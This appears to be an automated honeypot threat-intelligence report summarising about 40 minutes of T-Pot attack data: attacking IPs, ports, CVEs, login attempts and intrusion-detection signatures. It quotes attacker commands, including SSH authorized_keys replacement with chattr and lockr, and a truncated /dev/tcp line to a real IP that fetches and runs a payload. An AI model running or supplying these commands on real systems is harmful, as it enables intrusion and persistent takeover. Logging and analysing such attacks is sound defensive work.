## Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-11T19:01:36Z
**Timeframe:** 2025-10-11T18:20:01Z to 2025-10-11T19:00:01Z
**Files Used:**
- agg_log_20251011T182001Z.json
- agg_log_20251011T184001Z.json
- agg_log_20251011T190001Z.json

### Executive Summary

This report summarizes 19,986 events collected from T-Pot honeypots over the last hour. The majority of attacks were captured by the Cowrie honeypot. A significant number of attacks targeted SMB (port 445) and SSH (port 22). Several CVEs were detected, with the most frequent being related to older vulnerabilities. A large volume of automated commands, likely from bots, was observed, primarily focused on reconnaissance and establishing control.

### Detailed Analysis

**Attacks by Honeypot:**
*   **Cowrie:** 9,160
*   **Dionaea:** 3,042
*   **Honeytrap:** 3,003
*   **Ciscoasa:** 1,843
*   **Suricata:** 1,684
*   **Redishoneypot:** 884
*   **Sentrypeer:** 143
*   **ssh-rsa:** 60
*   **H0neytr4p:** 41
*   **Tanner:** 33
*   **ConPot:** 32
*   **Mailoney:** 31
*   **Honeyaml:** 14
*   **Ipphoney:** 6
*   **ElasticPot:** 4
*   **Heralding:** 3
*   **Dicompot:** 3

**Top Attacking IPs:**
*   110.44.99.182: 2,366
*   95.170.68.246: 1,219
*   196.251.88.103: 1,002
*   47.180.61.210: 1,146
*   213.149.166.133: 544
*   209.141.47.6: 327
*   147.93.154.186: 327
*   152.32.203.205: 297
*   167.172.111.7: 306
*   45.95.52.162: 282
*   45.64.112.160: 331
*   159.253.36.117: 336
*   67.71.55.75: 358
*   213.32.245.214: 258
*   195.190.104.66: 248
*   120.48.179.183: 209
*   94.180.217.138: 199
*   118.145.177.248: 167
*   147.50.227.79: 159
*   13.233.157.85: 162

**Top Targeted Ports/Protocols:**
*   445: 2,971
*   22: 1,331
*   6379: 879
*   5903: 189
*   5060: 143
*   TCP/5900: 154
*   5908: 83
*   5909: 82
*   TCP/22: 70
*   8333: 58
*   5901: 73
*   80: 30
*   5907: 48
*   27017: 33
*   10001: 26
*   443: 34
*   1234: 35
*   23: 34
*   9000: 12
*   1434: 34

**Most Common CVEs:**
*   CVE-2002-0013 CVE-2002-0012: 6
*   CVE-2002-0013 CVE-2002-0012 CVE-1999-0517: 4
*   CVE-2021-3449 CVE-2021-3449: 3
*   CVE-2019-11500 CVE-2019-11500: 3
*   CVE-2019-12263 CVE-2019-12261 CVE-2019-12260 CVE-2019-12255: 2
*   CVE-1999-0183: 1
*   CVE-2005-4050: 1
*   CVE-2022-27255 CVE-2022-27255: 1

**Commands Attempted by Attackers:**
*   whoami: 43
*   cd ~; chattr -ia .ssh; lockr -ia .ssh: 42
*   lockr -ia .ssh: 42
*   cd ~ && rm -rf .ssh && mkdir .ssh && echo ...: 42
*   cat /proc/cpuinfo | grep name | wc -l: 42
*   w: 42
*   uname -m: 42
*   cat /proc/cpuinfo | grep model | grep name | wc -l: 42
*   top: 42
*   uname: 42
*   uname -a: 42
*   lscpu | grep Model: 42
*   df -h | head -n 2 | awk 'FNR == 2 {print $2;}': 42
*   cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}': 41
*   free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}': 41
*   ls -lh $(which ls): 41
*   which ls: 41
*   crontab -l: 41
*   Enter new UNIX password: : 30
*   Enter new UNIX password:: 30

**Signatures Triggered:**
*   ET DROP Dshield Block Listed Source group 1: 446
*   2402000: 446
*   ET SCAN NMAP -sS window 1024: 156
*   2009582: 156
*   ET SCAN MS Terminal Server Traffic on Non-standard Port: 91
*   2023753: 91
*   ET DROP Spamhaus DROP Listed Traffic Inbound group 42: 81
*   2400041: 81
*   ET INFO Reserved Internal IP Traffic: 62
*   2002752: 62
*   ET SCAN Potential SSH Scan: 42
*   2001219: 42
*   ET DROP Spamhaus DROP Listed Traffic Inbound group 41: 67
*   2400040: 67

**Users / Login Attempts:**
*   root/: 60
*   345gs5662d34/345gs5662d34: 41
*   root/3245gs5662d34: 12
*   xxx/xxx: 6
*   minecraft/minecraft: 5
*   root/lkilogmL: 4
*   nobody/Passw0rd: 6
*   debian/123123: 6
*   john/john: 6
*   hacluster/hacluster: 6
*   root/P@ssword: 4
*   root/bapise033: 4
*   debian/1234: 4
*   root/sama9com: 4
*   shweta/123: 4
*   admin/openvpn: 4

**Files Uploaded/Downloaded:**
*   ohshit.sh;: 8
*   11: 2
*   fonts.gstatic.com: 2
*   css?family=Libre+Franklin%3A300%2C300i%2C400%2C400i%2C600%2C600i%2C800%2C800i&amp;subset=latin%2Clatin-ext: 2
*   ie8.css?ver=1.0: 2
*   html5.js?ver=3.7.3: 2

**HTTP User-Agents:**
*   None Observed

**SSH Clients:**
*   None Observed

**SSH Servers:**
*   None Observed

**Top Attacker AS Organizations:**
*   None Observed

### Key Observations and Anomalies

*   **High Volume of Automated Attacks:** The repetitive nature of commands and login attempts across multiple IPs suggests widespread automated attacks, likely from botnets.
*   **Focus on Remote Access Services:** A significant portion of attacks targeted SSH (port 22) and RDP (indicated by MS Terminal Server traffic), highlighting attackers' focus on gaining remote control of systems.
*   **Reconnaissance and Information Gathering:** Many of the executed commands (e.g., `whoami`, `uname -a`, `lscpu`) are indicative of attackers performing reconnaissance to understand the system they have compromised.
*   **Attempts to Maintain Persistence:** Commands like modifying `.ssh/authorized_keys` and checking `crontab` show attempts to establish persistent access to the compromised systems.
*   **Exploitation of Older Vulnerabilities:** The detected CVEs are relatively old, suggesting that attackers are still targeting systems that have not been patched for known vulnerabilities.
*   **File Downloads from a Single IP:** A large number of `nohup bash -c "exec 6<>/dev/tcp/47.120.55.164/60128 ..."` commands were observed, all originating from the same IP address (47.120.55.164). This indicates a coordinated campaign to download and execute malicious payloads on compromised systems.
---
